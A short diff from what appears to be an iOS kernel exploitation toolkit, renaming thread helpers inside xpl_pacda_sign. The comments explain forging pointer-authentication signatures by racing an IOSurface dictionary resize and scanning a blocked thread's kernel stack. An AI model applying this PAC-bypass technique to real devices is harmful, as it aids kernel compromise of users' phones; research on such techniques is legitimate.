@@ -414,7 +414,7 @@ uintptr_t xpl_pacda_sign(uintptr_t ptr, uint64_t ctx) {
     /// STEP 4: Add one more unique key to `props` dictionary in separate background thread.
     /// This thread will be kept blocked until lock acquired in STEP 3 is released
     dispatch_async(xpl_dispatch_queue(), ^() {
-        *waiting_thread = xpl_xnu_thread_current_thread();
+        *waiting_thread = xpl_thread_current_thread();
         dispatch_semaphore_signal(sem_add_value_start);
         /// This call will lead to triggering of `OSDictionary::ensureCapacity` method in
         /// IOSurface props dictionary. The method will first allocate a new array from
@@ -444,7 +444,7 @@ uintptr_t xpl_pacda_sign(uintptr_t ptr, uint64_t ctx) {
     /// location where link register for branch with link call to `kfree_type_var_impl_internal`
     /// method from `OSDictionary::ensureCapacity` method is stored
     uintptr_t lr_kfree_stack_ptr;
-    error = xpl_xnu_thread_scan_stack(*waiting_thread, lr_kfree, XPL_PTRAUTH_MASK, 1024, &lr_kfree_stack_ptr);
+    error = xpl_thread_scan_stack(*waiting_thread, lr_kfree, XPL_PTRAUTH_MASK, 1024, &lr_kfree_stack_ptr);
     xpl_assert_err(error);
     
     uintptr_t x19 = lr_kfree_stack_ptr - 0x10; // dict
